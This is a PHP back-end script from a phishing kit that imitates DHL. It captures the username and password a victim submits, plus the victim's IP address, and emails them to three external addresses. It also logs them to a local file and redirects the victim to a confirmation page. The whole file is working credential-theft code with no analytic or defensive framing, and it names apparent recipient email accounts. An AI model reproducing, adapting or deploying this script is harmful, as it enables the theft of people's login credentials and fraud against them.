<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------DHLX-----------------------\n";
$message .= "USER   : ".$_POST['user']."\n";
$message .= "PAZZ   : ".$_POST['pass']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "-------------------------------------------------------------\n";
$send = "tools.jaiye@yandex.com,brenda.eyers2@outlook.com,toolfoundation@excite.com";
$subject = "DHLxx2019";
$headers = "From: DHL08<roger@yandex.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("users.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: confirm.html");

	 
?>

